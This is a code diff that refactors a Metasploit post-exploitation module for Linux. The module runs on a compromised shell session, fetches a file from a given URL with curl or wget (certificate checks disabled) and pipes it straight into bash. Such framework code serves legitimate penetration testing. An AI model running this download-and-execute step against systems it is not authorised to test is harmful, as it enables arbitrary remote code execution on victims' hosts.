@@ -18,23 +18,37 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::File
 	include Msf::Post::Linux::System
 
-
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Linux Download Exec',
+			'Name'          => 'Linux Manage Download and Exececute',
 			'Description'   => %q{
-				This module downloads and runs a file with bash. It first
-tries to uses curl as its HTTP client and then wget if it's not found. Bash
-found in the PATH is used to execute the file.},
+					This module downloads and runs a file with bash. It first tries to uses curl as
+				its HTTP client and then wget if it's not found. Bash found in the PATH is used to
+				execute the file.
+			},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'Joshua D. Abraham
-				<jabra[at]praetorian.com>', ], 'Platform'      => [ 'linux' ],
-				'SessionTypes'  => [ 'shell' ]))
-		register_options(
-		[
-			OptString.new('URL', [true, 'Full URL of file to download.'])
-		], self.class)
+			'Author'        =>
+				[
+					'Joshua D. Abraham <jabra[at]praetorian.com>',
+				],
+			'Platform'      => [ 'linux' ],
+			'SessionTypes'  => [ 'shell' ]
+		))
 
+		register_options(
+			[
+				OptString.new('URL', [true, 'Full URL of file to download.'])
+			], self.class)
+
+	end
+
+	def cmd_exec_vprint(cmd)
+		vprint_status("Executing: #{cmd}")
+		output = cmd_exec(cmd)
+		if output.length > 0
+			vprint_status("#{output}")
+		end
+		return
 	end
 
 	def exists_exe?(exe)
@@ -50,40 +64,40 @@ found in the PATH is used to execute the file.},
 		return false
 	end
 
-	def run
-		stdout_option = ""
+	def search_http_client
 		print_status("Checking if curl exists in the path...")
 		if exists_exe?("curl")
-			print_good("curl available, going ahead...")
-			http_client = "curl"
-			ssl_option = "-k"
-		else
-			print_warning("curl not available on the $PATH, checking for wget...")
-			print_status("Checking if wget exists in the path...")
-			if exists_exe?("wget")
-				print_good("wget available, going ahead...")
-				http_client = "wget"
-				stdout_option =  "-O-"
-				ssl_option = "--no-check-certificate"
-			else
-				print_warning("neither curl nor wget available in the $PATH, aborting...")
+			print_good("curl available, using it")
+			@stdout_option = ""
+			@http_client = "curl"
+			@ssl_option = "-k"
 			return
-			end
+		end
+
+		print_status("Checking if wget exists in the path...")
+		if exists_exe?("wget")
+			print_good("wget available, using it")
+			@http_client = "wget"
+			@stdout_option =  "-O-"
+			@ssl_option = "--no-check-certificate"
+			return
+		end
+
+	end
+
+	def run
+		search_http_client
+
+		if not @http_client
+			print_warning("neither curl nor wget available in the $PATH, aborting...")
+			return
 		end
 
 		if datastore['URL'].match(/https/)
-			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{ssl_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
 		else
-			cmd_exec_vprint("`which #{http_client}` #{stdout_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
+			cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which bash` ")
 		end
 	end
 
-	def cmd_exec_vprint(cmd)
-		vprint_status("Executing: #{cmd}")
-		output = cmd_exec(cmd)
-		if output.length > 0
-			vprint_status("#{output}")
-		end
-		return
-	end
 end
